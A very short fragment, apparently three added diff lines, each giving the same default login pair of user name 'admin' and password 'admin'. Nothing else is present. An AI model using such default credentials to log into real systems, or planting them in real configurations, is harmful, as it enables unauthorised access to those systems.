+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
